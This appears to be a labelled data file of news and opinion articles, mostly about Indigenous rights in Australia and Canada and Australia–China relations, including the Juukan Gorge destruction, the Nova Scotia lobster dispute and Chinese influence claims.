1," Sign me up for the newsletter! Western Australia's Juukan Gorge has been home to a sacred site to local Indigenous peoples for over 46,000 years. In May of 2020, the site was destroyed in an explosion designed to expand a nearby iron ore mine. About the House: the official channel of the Australian House of Representatives The chief executive officer and two senior executives are being forced out of the mining giant Rio Tinto several months after investors started to revolt over the company’s destruction of an ancient aboriginal rock shelter, according to CNN. CEO Jean-Sebastian Jacques will leave in March 2021, while two senior executives, Chris Salisbury, iron ore chief executive, and Simone Nieven, head of corporate relations who had the responsibility of handling relations with Indigenous communities, will leave at the end of 2020, according to Forbes. The 48-year-old chief executive is being forced out after investors listened to a continuing outcry from the Indigenous people of Australia who were horrified that Rio Tinto would trounce upon their sacred ground and blast away the ancient Juukan Gorge rock shelters, two culturally significant rock shelters in Western Australia’s Pilbara region. Despite knowing the importance of the grounds to the the Puutu Kunti Kurrama and Pinikura people, Rio Tinto blasted the site in order to mine a better quality of iron ore, according to The Guardian. The company’s board responded to the move by cutting executive pay and stripping the three executives of million in bonuses, but investors lined up to denounce that penalty as inadequate. “There were certainly some shareholders who felt strongly that the accountability was inappropriate and that this was an issue that needed to be addressed to rebuild trust,” said Rio Tinto Chairman Simon Thompson to The Sydney Morning Herald. “While there is general recognition of the transparency of the board review and support for the changes recommended, significant stakeholders have expressed concerns about executive accountability for the failings identified,” the company said in a statement, as The Guardian reported. The wanton destruction of the site has shed light on the remarkable power the mining industry has over sacred, traditional lands. It has shown the need for greater legal guarantees to make sure heritage sites are protected. A spokesperson for the Puutu Kunti Kurrama and Pinikura people told The Sydney Morning Herald, “Our focus continues to rest heavily on preserving Aboriginal heritage and advocating for wide-ranging changes to ensure a tragedy like this never happens again. We cannot and will not allow this type of devastation to occur ever again.” Among the prominent shareholders to express their misgivings were several large Australian investment funds and a group of 81 British pension funds. Also, the National Native Title Council in Australia said the board was divorced from reality in thinking that the pay cuts were somehow just punishment for destroying a 46,000-year-old site, according to The Sydney Morning Herald. “There is more work to be done,” said Jamie Lowe, chief executive for the National Native Title Council, as The Guardian reported. “The law needs to be strengthened. We can’t rely on the goodwill of mining companies, we need the law strengthened. We can’t rely on their word that things will get better.” “What happened at Juukan was wrong,” Thompson said Friday to The Sydney Morning Herald. “We are determined to ensure the destruction of a heritage site of such exceptional archaeological and cultural significance never occurs again at a Rio Tinto operation.” Ian Silk, the chief executive of Australia’s biggest superannuation fund, AustralianSuper, said that he was “satisfied that appropriate responsibility has now been taken by executives at Rio Tinto,” according to The Guardian, “Rio can now work with traditional owners to guarantee that its processes are appropriate for the protection of culturally important sites and that it has the right internal accountabilities,” he added, as The Guardian reported. Additionally, the Australian Center for Corporate Responsibility applauded Friday’s announcement as an end to the “dishonest malaise of Rio Tinto’s board and senior management,” according to The Guardian. While the news of the executives departing is welcome, the institutional investors who have the clout to spur action within the company said the company would have to take steps to repair its relationship with Australia’s Indigenous people. “Rio Tinto now has the opportunity to address the necessary remediation, cultural heritage and risk processes with fresh eyes,” said Louise Davidson, chief executive of the Australian Council of Superannuation Investors, which advises 38 large super funds on governance issues, to The Guardian. “Rio Tinto must prioritise working with traditional owners the Puutu Kunti Kurrama and Pinikura people to rebuild their relationship. It is critical that this is not delayed,” she added.  Sign me up for the newsletter! The best of EcoWatch right in your inbox Sign up for our email newsletter!  Sign me up for the newsletter!"
1,"In response to heavy criticism for benching Super Netball’s only Indigenous player in the Indigenous round, Netball Australia held a press conference on Tuesday to announce a ‘declaration of commitment’ to Aboriginal and Torres Strait Islander players. The declaration by 20 national, state and territory-based organisations promises to “take significant action to break down the barriers that have prevented Aboriginal and Torres Strait Islander players, coaches, umpires and administrators from flourishing in the sport.” Among them is the Queensland Firebirds, whose explanation for benching Waka Waka woman Jemma Mi Mi for the Indigenous round - despite using her to promote the event, and Mi Mi being the only Indigenous player in any of Super Netball’s eight teams - prompted criticism from fans. Head Coach Roselee Jencke said the decision to leave Ms Mi Mi off the court was “strategic” in a statement that both revealed ""cultural awareness"" provided by Ms Mi MI to the team, and led to the amplification of former players' stories of racial discrimination within the sport. Among those detailing their negative experiences was former elite netballer Helena Saunders, the first Indigenous player for the Queensland Firebirds, who wrote an op-ed for online media platform IndigenousX. ""I don't actually want an apology, I want things to change,"" Ms Saunders later told NITV. Celeste Carnegie also spoke of her experiences in an op-ed for IndigenousX titled 'Racism ended my netball career before it even began.' There is racism across all forms of sport in Australia. Netball was never any different. I've experienced many incidences of racism within most teams I've been part of. — CC BANKS ⚡ (@celestecarnegie) June 10, 2020 “We acknowledge that netball hasn’t fully addressed the barriers that confront Aboriginal and Torres Strait Islander peoples in our system, and we apologise for this,” the declaration read, “We know it is unacceptable to have only one Aboriginal player within the Suncorp Super Netball league, but our challenge as a sport goes far beyond what happened to one player in a single game.” “Today, Netball Australia, Suncorp Super Netball, Member Organisations, SSN Clubs, the Australian Netball Players Association and the Confident Girls Foundation have committed to the change required in our pathways from grassroots to the Origin Diamonds – a change that will only be achieved in true partnership with netball’s Aboriginal and Torres Strait Islander communities.” Tuesday's announcement has been praised as ""a good step forward"". This is a good step forward - Netball Australia has not only said they are committed to understanding and then resolving under-representation of Mob at an elite level, but have released a plan detailing how they will do so. https://t.co/0TkGAIXzxd — Lidia Thorpe (@lidia__thorpe) September 29, 2020 The first step for the declaration commitment will focus on “understanding further the experiences of players, coaches, umpires and administrators in our system, identifying the barriers to greater Aboriginal and Torres Strait Islander participation and creating sustainable change plans,” along with tracking and reporting on the changes made. The first report will come in October, showing the ‘State of the Game’ review findings. The development of “strategy framework” to make the promised changes will be lead by Marcia Ella-Duncan, Sharon Finnan-White, Stacey Campton, and Ali Tucker-Munro.   "
1,"Indigenous fishers in Canada are asserting their right to fish for a ‘moderate livelihood’ outside the regulated fishing season. An Indigenous community leader in eastern Canada is renewing his call for concrete action from the federal government after a lobster pound in the province of Nova Scotia was destroyed overnight Saturday. In a statement shared by APTN News, Mike Sack, chief of Sipekne’katik First Nation, said the fire at the lobster pound in Middle West Pubnico, a small fishing village 270km (168 miles) west of Halifax, demonstrates “the need for greater police presence in the region”. Sack said the storage facility is “owned by a friend and ally of Sipekne’katik”. “This should never have happened and the people responsible should be brought to justice,” he said. “I am once again calling on Prime Minister [Justin] Trudeau and the RCMP (federal police force) to dedicate the necessary resources to this region to protect everyone.” This has gone TOO far. Fire crackling woke us up. Middle West Pubnico tonight 🥺 #MikMaq #TreatyRights pic.twitter.com/62M6l5B8o3 — Pierrette dEntremont (@PAdEntremont) October 17, 2020  Nova Scotia RCMP said it was investigating the fire as “suspicious”. “The fish plant incurred significant damage, it was not occupied at the time and no employees were injured, a man is in hospital with life-threatening injuries believed related to the fire,” the police said in a statement Saturday. Tense confrontations have taken place during the past several weeks between commercial and Indigenous fishers in Nova Scotia, who are exerting their right to fish outside Canada’s federally regulated fishing season. The Mi’kmaw people have a right under Canada’s constitution and treaties signed with the British Crown in the 1700s to fish in order to maintain a “moderate livelihood”. But while that right was affirmed by the Supreme Court of Canada in 1999, the court never defined what a “moderate livelihood” means in practice. Sipekne’katik First Nation launched its own moderate livelihood fishery last month to be able to harvest outside of the season, prompting the ire of non-Indigenous commercial fishers in the province. Last week, a mob of hundreds of non-Indigenous fishers surrounded Indigenous fishers, APTN News reported. A van was set ablaze and hundreds of Indigenous fishers’ lobsters were destroyed in two separate incidents in the area. A man has been charged in relation to an assault on Chief Sack on October 14, the RCMP also said on Saturday. Police have been criticised for appearing to stand by during last week’s acts of violence against the Indigenous fishers, while Indigenous leaders across Canada have called on the Nova Scotia and federal governments to do more to ensure people are protected. Canada’s public safety minister, Bill Blair, said he was “confident the unacceptable acts of violence will be thoroughly investigated and the perpetrators will be held to account”. “The threats, violence and intimidation have to stop. We all need to acknowledge that a lasting resolution to this dispute can only be concluded if it is rooted in the recognition of legitimate Mi’kmaw treaty rights,” Blair said in a statement. The recent acts of violence in Nova Scotia are unacceptable and I strongly condemn them. pic.twitter.com/7sWOGXCcTq — Bill Blair (@BillBlair) October 17, 2020  Follow Al Jazeera English:"
1,"There were 39 vehicles in the convoy, several displaying large flags including the Six Nations flag and the Warrior society flag. A convoy of cars and trucks from the Kahnawake Mohawk community turned out Sunday afternoon in a show of solidarity with Indigenous fishers in southwestern Nova Scotia. In the latest incident in an escalating crisis over Indigenous fishing treaty rights, a suspicious fire early Saturday gutted a lobster pound in which Mi’kmaq fishers in Middle West Pubnico, N.S., had been storing their catches. The 39 vehicles in the convoy, several displaying large flags including the Six Nations flag and the Warrior society flag, started out shortly after 1 p.m., creating a sort of rolling blockade as they drove through Kahnawake. They headed along Highway 132 toward St-Constant before turning around and returning along Highway 132, under the Mercier Bridge and then up Highway 138. The Kahnawake Mohawk Peacekeepers provided an escort car at the front of the convoy and another at the rear, said Constable Kyle Zachary of the Kahnawake police force. The highways remained open, but the convoy caused “an intentional slowdown to draw attention to the situation,” he said. The blaze in Middle West Pubnico was set days after raids on two facilities in the province, where Mi’kmaq fishers were storing their catches, by several hundred commercial fishermen and their supporters to protest against a “moderate livelihood” lobster fishery launched by the Sipekne’katik First Nation last month, outside the federally mandated commercial season. A Digby County man was charged on Friday after an assault on Sipekne’katik First Nation Chief Mike Sack Wednesday. On Saturday, Sack called for military support to prevent commercial fishermen from “taking the law into their own hands.” sschwartz@postmedia.com Sign up to receive daily headline news from the Montreal Gazette, a division of Postmedia Network Inc.

1,"Australia Post says it will support the optional use of Aboriginal place names on mail addresses, following a large grassroots campaign. The national mail service changed its guidelines this week to include advice on how to include traditional names. While some areas are known by their original names, many Australians often have little knowledge of place names that pre-date European settlement. Activists welcomed the endorsement of their push for greater awareness. Aboriginal woman Rachael McPhail started the campaign on social media in August, noting Aboriginal people had lived in Australia for at least 60,000 years. ""Every area in this country had an original place name prior to being given its colonial town/city name, and I believe that it's important to acknowledge this,"" she said. Australia Post advised people to identify traditional place names from a map on the Australian Institute of Aboriginal and Torres Strait Islander Studies (AIATSIS) website, or through local land councils and cultural centres. These traditional names represent language, social or nation groups. Their general locations have been mapped by AIATSIS, which notes boundaries are not exact. Source: AIATSIS Close to 15,000 people have signed her petition. ""These are excellent first steps towards social change, so thank you again to all of you for signing the petition and emailing Australia Post,"" Ms McPhail said. In its new guidelines, Australia Post says mail senders can include original names to ""acknowledge the Traditional Custodians of the land your item is being delivered on"". It advises people to use the second line of the address - after the sender's name and before the street address. It also plans to introduce envelopes and packaging printed with an ""Acknowledgement of Country"" message - a standard statement in Australia which acknowledges the local people's connection to the land. Ms McPhail said she would continue to lobby Australia Post to create a national database of traditional place names, through consulting with Aboriginal elders. This video can not be played ""In order to achieve true social change and decolonisation of the address system within Australia, we need Australia Post to undertake this project,"" she said.

1," Chinese students accuse Australia of 'politically motivated' visa delays The Department of Home Affairs has been accused of delaying the visa applications of Chinese PhD candidates, with prospective students telling state media they were victims of ""politically motivated setbacks"". A group of 135 Chinese PhD students and 30 other visiting students sent an email to the state-owned Global Times tabloid newspaper, saying they had all experienced lengthy delays on their Australian student visa applications. The claims follow several reports last year detailing concern over the national security impacts of university research collaborations with Chinese entities. Australia's top universities could be aiding the Chinese Communist Party's mission to develop mass surveillance and military technologies. In response, universities adopted new voluntary guidelines to combat foreign interference and risky research partnerships. One of the would-be postgraduate students said they had been left hanging for 17 months, while the majority said they had waited more than five months since applying. Most of the students were studying in science, technology, engineering and maths (STEM) related fields, the newspaper reported. On its website, the Department says 90 per cent of applicants for postgraduate research visas receive a decision within four months. So are the long-waiting times due to ""paranoid voices against China"" in Canberra — as the Global Times suggested in a follow-up editorial — or is it just a case of bureaucratic bungling? The affected students told Chinese media their scholarships had expired, or were coming close to expiring, while they waited for Home Affairs to make a decision on their visas. They blamed their troubles on the cool relations between Beijing and Canberra, and the ongoing debate over Chinese political influence in Australia. Inside a massive cyber attack on the Australian National University that risks compromising high-ranking officials across the globe. Asked whether national security concerns were driving the alleged visa slow-down, Home Affairs told the ABC processing times were driven by a range of factors, including ""assessments in relation to health, character and national security requirements"". ""These requirements are not new and they are not specific to Chinese nationals,"" Home Affairs said in a statement. It said the student visa grant rate for visa applicants for Chinese postgraduate students was 98.9 per cent, which was slightly higher than the overall grant rate of 98.6 per cent. The University of Melbourne told the ABC it was supporting prospective PhD students ""from various countries"" experiencing slower-than-expected processing times. In a statement, it said there were in many cases ""considerable delays"" in getting their visas approved. ""[The University of Melbourne] is communicating with the Government about this matter to help them to understand the problems caused for the students and for the University by these delays,"" it said. Adam Ni, co-editor of the China analysis newsletter China Neican, told the ABC the main concern was that individuals could be linked to the Chinese Government, and conduct espionage including transferring sensitive technology to authorities there. ""At a broad level, there is increasing anxiety about Chinese party state influence and interference in Australia, this has extended into research collaboration, and recently into individuals that are conducting research,"" Mr Ni said. ""Certainly the cases are quite disturbing that came to light over the last decade about researchers that are conducting espionage or somehow infringing intellectual property."" A joint investigation by Four Corners, The Age and Sydney Morning Herald reveals fresh and compelling evidence of covert Beijing-backed political activity taking place in Australia. But Mr Ni said Australia should be cautious but not overreact, or else run the risk of creating ""an environment of distrust"". ""The problem was just a few individuals that had links to the [Communist] Party, rather than a whole body of researchers,"" he said. ""There are still tremendous advantages from research collaboration and having an influx of Chinese students, a whole range of benefits that are really important to Australia's national interest.""

1,"By Charlie Moore For Daily Mail Australia Published: 22:57 EDT, 5 February 2020 | Updated: 23:13 EDT, 5 February 2020  1 View comments  Chinese tourists in Australia are scrambling to extend their visas to avoid heading home where coronavirus has killed 563 people. Migration agents say they have been inundated with inquiries from holidaymakers desperate to stay Down Under. Tourist visas usually last three months but can be extended for up to a year upon request. Chinese tourists in Australia are scrambling to extend their visas to avoid heading home where coronavirus has killed around 563 people Legal experts say Chinese visitors will have a good case to extend their visas if travel restrictions due to the coronavirus outbreak make their journeys home difficult. Jennifer Zhu, a Sydney migration lawyer, said she has been working overtime to deal with a high volume of applications. 'A lot of them are very urgent due to the remaining days on their visas,' she told the ABC. 'Some of them might only have a few more days before they must leave and they need professional advice instantly.' Jinfeng Wang and Xikun Zhang, who left China to visit their daughter in Melbourne before the outbreak, are among those who want to extend their tourist visas. 'I'm really worried. If we return to China there is a high risk of getting infected,' Ms Wang told the ABC. It comes as Virgin Australia cancels flights from Sydney to Hong Kong from 2 March. The company the move to save money because not enough customers were booking flights as coronavirus spreads around the world. The airline decided to axe some international routes and cut 750 jobs after it lost $350million in 2019. In November it announced its service from Melbourne to Hong Kong will stop on 11 February - and it also slashed several domestic routes. Patients infected by the coronavirus rest at a makeshift hospital at Wuhan International Convention and Exhibition Center in Wuhan City Virgin Australia Group Chief Commercial Officer John MacLeod said the spread of the coronavirus and recent protests played a part in the decision to also cancel the Sydney route. He said in a statement: 'Hong Kong has continued to be a challenging market. 'With a decline in demand following ongoing civil unrest, and growing concerns over the coronavirus outbreak in the wider region, we have made the decision to withdraw services. 'While the decision to withdraw from the Hong Kong market has been a difficult one, it demonstrates our strong focus on driving greater financial discipline through our network. 'Current circumstances demonstrate that Hong Kong is no longer a commercially viable route for Virgin Australia to continue operating, however international tourism remains an important part of our strategy through our other international routes and partner airlines.' Last month several airlines cancelled flights in and out of China as the coronavirus spread from Wuhan - but only Virgin has cancelled flights to Hong Kong. DFAT's advice for Australians travelling to Hong Kong is to 'exercise a high degree of caution'. All passengers entering or connecting in the city will have their temperatures checked and will not be allowed to board if they have a fever.

1,"(Minghui.org) The Chinese Consulate in Western Australia has contacted the City of Perth on many occasions, attempting to persuade officials to stop the city from issuing permits to Falun Gong practitioners for their activities and demonstrations. According to a report by Nathan Hondros published by digital media WAtoday on February 11, 2020, the Chinese Consulate frequently contacts the city's executive management team to complain about Falun Gong practitioners' protests, but officials have always rejected these requests. The City of Perth's community development general manager Anne Banks-McAllister told Mr. Hondros that the City of Perth has noted the Consulate's concerns, but continues to issue permits for Falun Gong practitioners' activities because they have always complied with the law.  Falun Gong practitioners in Western Australia hold activities to raise awareness of the ongoing persecution in China in the capital city's central business district on July 19 and 20, 2019. Falun Gong practitioners in Western Australia regularly hold activities throughout the city's Central Business District and near the Chinese consulate office to raise awareness of the Chinese Communist Party's torture and illegal detention of practitioners because of their belief. In 2018, the Chinese Consulate's attempt to have Falun Gong barred from participating in the Perth Christmas parade was exposed by Australian media. Falun Gong had participated in the parade every year since 2008. Albert Lin, representative of the Western Australia Falun Dafa Association, said the CCP had tried to stop their peaceful protests on countless occasions. “The City of Perth has done the right thing,” he said. Mr. Lin said that practitioners were often harassed or threatened in Perth. “Suspicious people would cause trouble at our information booths in the city. They shout at you and you cannot reason with them. For instance, at an event held in the city last year, a man yelled at us. Three passersby asked him to stop, but he refused. They called the police and he quickly left,” Mr. Lin said. In recent years, countless reports have been published in Australian media about the CCP's infiltration and these reports have drawn the attention of elected officials, as well as ordinary Australians. Mr. Lin told Minghui that a Federal Member in Western Australia once told him a story which provides insight into the Communist regime's attempts to influence Australian politics. “A Federal Member won an election several years ago. When he was in office, he kept refusing practitioner's requests for a meeting. When I met this politician a few years later, he told me he had received a letter from the Chinese ambassador to Australia after winning the election warning him not to see Falun Gong practitioners. He was shocked and angry at the audacity of the ambassador. But he chose to heed the warning over the years as it was in his interest to do so,” Mr. Lin said. The CCP tries to influence Australian society through bribing politicians, making contributions to influence policy making, controlling student organizations and Chinese media in Australia, and setting up organizations such as the Confucius Institute and so on. In a piece he wrote for China in Perspective in August 2016, Chen Yonglin, a former consular officer who defected to Australia in 2005, warned that the Australian Government has caused Australia to gradually become China's backyard. “The Communist Party of China had begun a structured effort to infiltrate Australia in a systematic way,” Mr. Chen wrote. Former Australian Security Intelligence Organisation (ASIO) boss Duncan Lewis, in an interview with the Sydney Morning Herald published in November 2019, said that any person was a political target. As well as targeting politicians, Chinese authorities were working to win influence over social, business and media circles, so as to place themselves in an advantageous position. Mr. Lewis was ASIO's director-general of security for five years. ASIO is an intelligence agency and its primary role is to guard against foreign interference. He said without inhibition in the interview, “Covert foreign intrusion from China into the heart of Australian politics is overwhelming” and was “something we need to be very, very careful about.” He also told the Sydney Morning Herald, “The Chinese-Australian community could and should be as vital in the work against foreign covert influence.” Chinese version available Category: Persecution Outside China “Falun Gong Presented at Health Expo in Odense, Denmark” “Save Sentient Beings with Compassion in the Face of Coronavirus Epidemic” "
1,"A NSW Labor Party MP who has praised the Chinese Communist Party was essentially “pathetically putting out Chinese propaganda from the floor of the parliament” says former Labor Minister Stephen Conroy. The Member of the NSW Upper House, Shaoquett Moselmane, has been caught out for praising the Chinese government for containing the deadly coronavirus, while also adding the Communist government’s response was “decisive” and “emphatic”. Mr Conroy told Sky News host Peta Credlin, Mr Moselmane is an “absolute disgrace to the Labor Party” and it is “astonishing he’s still in parliament”. “The NSW Labor Party need to have a good hard look at itself (as to) why it’s got someone so pathetically putting out Chinese propaganda from the floor of the parliament”.

1,"Mar 3 Posted by Editor, cairnsnews KAP Leader, Robbie Katter said it’s quite clear major businesses and government are closely aligned with China, after the ACCC cleared the way for China Mengniu Dairy to takeover Lion’s dairy and drinks portfolio. “Unlike Australia, China’s government looks after the Chinese people first and foremost,” he said. “It’s no secret that they have an insatiable appetite for our goods and industry and when it comes to their interests compared to ours, of course we will lose. Robbie Katter slams the LNP and ALP for selling off remaining dairy industry assets to a Chinese government company. “Governments have proven time and again that they are less than willing to correct that imbalance.” The State Member for Traeger said it was a bad outcome for the nation’s dairy farmers. “While foreign investment is nothing new to the dairy industry, it still remains a characteristic of the government culture in Australia,” he said. Federal Member for Kennedy, Bob Katter said he was sick of the blood sucking Sydney suits selling their country out. “They get their 30 pieces of sliver for selling their country but I am certain they will rot in Hell,” Mr Katter said. “The government is a joke. It’s not a government. It doesn’t bear any resemblance to a government. “They are not reflecting the will of the people. The only will Australia’s governments reflect is the one they see in the mirror.” Mr Katter said he was taking his fight against the foreign takeover of Australia to the Parliament; just last week he introduced the Foreign Acquisitions and Takeovers Amendment (Strategic Assets) Bill 2020.

Robbie, How about we get some balls and take a cup of cement and harden up and get something going for this country instead of all the rhetoric that I hear and you still collect your inflated salary and perks. Why can’t the remaining Dairy farmers start a co op and supply milk at a suitable price to the public. The current pollies look to what is good for them also to the next election to ensure they can keep their snout in the trough what is good for them but not what is good for the country. When can we get some Statesmen to lead. LikeLike GOOD ON YOU ROBBIE,GO FOR IT.
